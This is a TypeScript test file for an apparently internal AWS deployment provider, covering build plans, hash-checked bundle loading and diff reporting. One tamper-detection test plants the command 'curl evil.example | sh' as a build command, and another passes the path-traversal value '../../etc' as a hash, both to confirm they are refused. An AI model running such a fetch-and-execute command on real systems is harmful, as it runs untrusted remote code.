import { mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import type { Component, PlanChange } from '@hero-cloud/core';
import { afterAll, describe, expect, it } from 'vitest';
import { buildPlanFor } from './build/plan.js';
import { bundleHash, loadBundle } from './bundle.js';
import { createAwsProvider } from './provider.js';

const roots: string[] = [];
afterAll(() => {
  for (const root of roots) rmSync(root, { recursive: true, force: true });
});

const api: Component = {
  id: 'api',
  kind: 'http-service',
  capability: 'http-service',
  settings: { startCommand: 'node server.js' },
  rationale: [],
};
const site: Component = {
  id: 'site',
  kind: 'static-site',
  capability: 'web-frontend',
  settings: { outputDirectory: 'dist', buildCommand: 'npm run build' },
  rationale: [],
};
const environment = { accountId: '123456789012', region: 'us-east-1' };

async function stored(components: Component[]) {
  const root = mkdtempSync(join(tmpdir(), 'hero-bundle-'));
  roots.push(root);
  const provider = createAwsProvider({ assemblyDirectory: root });
  const result = await provider.describe({
    strategy: 'serverless',
    components,
    region: 'us-east-1',
    accountId: '123456789012',
    deploymentId: 'hero-b',
    inputs: [],
    allowNetwork: false,
  });
  return { root, result };
}

describe('plans with something to build', () => {
  it('list the build stack and every build with its exact commands', async () => {
    const { result } = await stored([site, api]);
    const types = result.changes.map((c) => c.resource.type);
    expect(types).toContain('codebuild-project');
    const builds = result.changes.filter((c) => c.resource.type === 'codebuild-build');
    expect(builds.map((c) => c.resource.name)).toEqual(['site', 'api']);
    expect(builds[0]?.details).toMatchObject({
      buildCommand: 'npm run build',
      outputDirectory: 'dist',
      image: 'aws/codebuild/amazonlinux-aarch64-standard:3.0',
      timeoutMinutes: 15,
      secretsExcluded: true,
    });
    expect(builds[1]?.details).toMatchObject({ startCommand: 'node server.js' });
  });

  it('change the artifact hash when a build command changes', async () => {
    const a = await stored([{ ...api, settings: { startCommand: 'node a.js' } }]);
    const b = await stored([{ ...api, settings: { startCommand: 'node b.js' } }]);
    expect(a.result.artifactHash).not.toBe(b.result.artifactHash);
  });

  it('need no build stack when nothing is built', async () => {
    const table: Component = {
      id: 'kv',
      kind: 'key-value-table',
      capability: 'key-value-data',
      settings: { partitionKey: 'id' },
      rationale: [],
    };
    const { result } = await stored([table]);
    expect(result.changes.map((c) => c.resource.type)).not.toContain('codebuild-project');
  });
});

describe('loadBundle', () => {
  it('returns the stored parts when they are the approved ones', async () => {
    const { root, result } = await stored([site]);
    const loaded = loadBundle(root, result.artifactHash, environment);
    expect(loaded.buildPlan.jobs.map((j) => j.id)).toEqual(['site']);
    expect(loaded.buildDirectory).toBeDefined();
  });

  it('refuses another account, another region, or an unknown hash', async () => {
    const { root, result } = await stored([site]);
    expect(() =>
      loadBundle(root, result.artifactHash, { ...environment, accountId: '999999999999' }),
    ).toThrow();
    expect(() =>
      loadBundle(root, result.artifactHash, { ...environment, region: 'eu-west-1' }),
    ).toThrow();
    expect(() => loadBundle(root, 'a'.repeat(64), environment)).toThrow();
    expect(() => loadBundle(root, '../../etc', environment)).toThrow();
  });

  it('refuses a bundle whose build commands were edited after approval', async () => {
    const { root, result } = await stored([site]);
    const file = join(root, result.artifactHash, 'bundle.json');
    const parts = JSON.parse(readFileSync(file, 'utf8')) as {
      buildPlan: { jobs: { buildCommand: string }[] };
    };
    parts.buildPlan.jobs[0]!.buildCommand = 'curl evil.example | sh';
    writeFileSync(file, JSON.stringify(parts));
    expect(() => loadBundle(root, result.artifactHash, environment)).toThrow();
  });

  it('hashes the same parts to the same value', () => {
    const buildPlan = buildPlanFor([site]);
    const parts = { appHash: 'a'.repeat(64), buildHash: 'b'.repeat(64), buildPlan };
    expect(bundleHash(parts)).toBe(bundleHash({ ...parts }));
    expect(bundleHash({ ...parts, buildHash: undefined })).not.toBe(bundleHash(parts));
  });
});

describe('provider.diff', () => {
  const request = (artifactHash: string, fresh: readonly PlanChange[]) => ({
    deploymentId: 'hero-b',
    artifactHash,
    accountId: '123456789012',
    region: 'us-east-1',
    fresh,
  });

  it('reports what the cloud will do, marks a replacement destructive, and re-applies the rest', async () => {
    const root = mkdtempSync(join(tmpdir(), 'hero-diff-provider-'));
    roots.push(root);
    const table: Component = {
      id: 'kv',
      kind: 'key-value-table',
      capability: 'key-value-data',
      settings: { partitionKey: 'id' },
      rationale: [],
    };
    const described = await createAwsProvider({ assemblyDirectory: root }).describe({
      strategy: 'serverless',
      components: [table, api],
      region: 'us-east-1',
      accountId: '123456789012',
      deploymentId: 'hero-b',
      inputs: [],
      allowNetwork: false,
    });
    const tableChange = described.changes.find((c) => c.resource.type === 'dynamodb-table');
    const logicalId = String(tableChange?.details?.logicalId);
    const provider = createAwsProvider({
      assemblyDirectory: root,
      toolkit: () =>
        Promise.resolve({
          fromAssemblyDirectory: (d) => Promise.resolve(d),
          deploy: () => Promise.reject(new Error('never')),
          destroy: () => Promise.reject(new Error('never')),
          diff: () =>
            Promise.resolve({
              'hero-b': {
                resources: {
                  changes: {
                    [logicalId]: {
                      isAddition: false,
                      isRemoval: false,
                      changeImpact: 'WILL_REPLACE',
                    },
                    Unchanged: { isAddition: false, isRemoval: false, changeImpact: 'NO_CHANGE' },
                  },
                },
              },
            }),
        }),
    });
    const changes = await provider.diff!(request(described.artifactHash, described.changes));
    const replaced = changes.find((c) => c.id === tableChange?.id);
    expect(replaced).toMatchObject({ action: 'replace', destructive: true });
    // The build stack and the builds are applied again as they are.
    const rest = changes.filter((c) => c.resource.type === 'codebuild-build');
    expect(rest.map((c) => c.action)).toEqual(['update']);
    expect(changes.every((c) => c.id !== 'nothing')).toBe(true);
  });

  it('needs the stored bundle and refuses a hash it does not have', async () => {
    const provider = createAwsProvider();
    await expect(provider.diff!(request('a'.repeat(64), []))).rejects.toMatchObject({
      code: 'provider.unavailable',
    });
    const root = mkdtempSync(join(tmpdir(), 'hero-diff-provider-'));
    roots.push(root);
    await expect(
      createAwsProvider({ assemblyDirectory: root }).diff!(request('a'.repeat(64), [])),
    ).rejects.toThrow();
  });
});
